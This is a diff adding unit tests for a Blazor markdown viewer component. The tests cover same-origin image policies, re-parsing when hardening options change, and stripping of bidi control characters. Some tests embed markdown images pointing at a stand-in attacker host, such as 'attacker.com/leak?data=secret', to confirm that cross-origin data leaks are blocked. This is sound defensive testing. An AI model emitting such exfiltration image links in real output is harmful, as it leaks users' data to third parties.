@@ -240,6 +240,37 @@ public class BitMarkdownViewerTests : BunitTestContext
     }
 
     [TestMethod]
+    public void BitMarkdownViewerShouldKeepAbsoluteSameOriginImagesInSameOriginMode()
+    {
+        // bUnit's test host resolves to http://localhost/, so an absolute URL that points
+        // back at that origin must NOT be blocked under the SameOrigin policy.
+        var component = RenderComponent<BitMarkdownViewer>(parameters =>
+        {
+            parameters.Add(p => p.Markdown, "![local](http://localhost/assets/logo.png)");
+            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.SameOrigin);
+        });
+
+        var imgs = component.FindAll(".bit-mdv img");
+        Assert.AreEqual(1, imgs.Count);
+        Assert.AreEqual("http://localhost/assets/logo.png", imgs[0].GetAttribute("src"));
+    }
+
+    [TestMethod]
+    public void BitMarkdownViewerShouldBlockRemoteImagesByDefault()
+    {
+        // ImageRendering defaults to the safe SameOrigin policy, so a cross-origin image
+        // is blocked even when the parameter is not set explicitly.
+        var component = RenderComponent<BitMarkdownViewer>(parameters =>
+        {
+            parameters.Add(p => p.Markdown, "![leak](https://attacker.com/leak?data=secret)");
+        });
+
+        var imgs = component.FindAll(".bit-mdv img");
+        Assert.AreEqual(1, imgs.Count);
+        Assert.AreEqual(string.Empty, imgs[0].GetAttribute("src") ?? string.Empty);
+    }
+
+    [TestMethod]
     public void BitMarkdownViewerShouldBlockProtocolRelativeImagesInSameOriginMode()
     {
         var component = RenderComponent<BitMarkdownViewer>(parameters =>
@@ -273,6 +304,7 @@ public class BitMarkdownViewerTests : BunitTestContext
         var component = RenderComponent<BitMarkdownViewer>(parameters =>
         {
             parameters.Add(p => p.Markdown, "![x](https://example.com/a.png)");
+            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.All);
         });
 
         var imgs = component.FindAll(".bit-mdv img");
@@ -322,6 +354,54 @@ public class BitMarkdownViewerTests : BunitTestContext
         });
 
         Assert.Contains("\u202E", component.Markup);
+    }
+
+    [TestMethod]
+    public void BitMarkdownViewerShouldReparseWhenHardeningOptionsChange()
+    {
+        // The component caches the parsed AST and only re-parses when an output-affecting
+        // input changes. Toggling the hardening options after the first render must
+        // invalidate that cache instead of reusing stale state.
+        var component = RenderComponent<BitMarkdownViewer>(parameters =>
+        {
+            parameters.Add(p => p.Markdown, "![leak](https://attacker.com/a.png)\n\n# hello world");
+            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.All);
+        });
+
+        // First render: All policy keeps the remote image and the full heading text.
+        Assert.AreEqual("https://attacker.com/a.png", component.FindAll(".bit-mdv img")[0].GetAttribute("src"));
+        Assert.Contains("<h1>hello world</h1>", component.Markup);
+
+        // Tighten ImageRendering and cap the length; the cached AST must be rebuilt.
+        component.SetParametersAndRender(parameters =>
+        {
+            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.SameOrigin);
+            parameters.Add(p => p.MaxLength, 38); // truncates before "world"
+        });
+
+        Assert.AreEqual(string.Empty, component.FindAll(".bit-mdv img")[0].GetAttribute("src") ?? string.Empty);
+        Assert.DoesNotContain("world", component.Markup);
+    }
+
+    [TestMethod]
+    public void BitMarkdownViewerShouldReparseWhenStripBidiToggles()
+    {
+        var markdown = "a\u202Eb";
+
+        var component = RenderComponent<BitMarkdownViewer>(parameters =>
+        {
+            parameters.Add(p => p.Markdown, markdown);
+        });
+
+        // Default keeps the bidi control character.
+        Assert.Contains("\u202E", component.Markup);
+
+        component.SetParametersAndRender(parameters =>
+        {
+            parameters.Add(p => p.StripBidiControlCharacters, true);
+        });
+
+        Assert.DoesNotContain("\u202E", component.Markup);
     }
 
     [TestMethod]
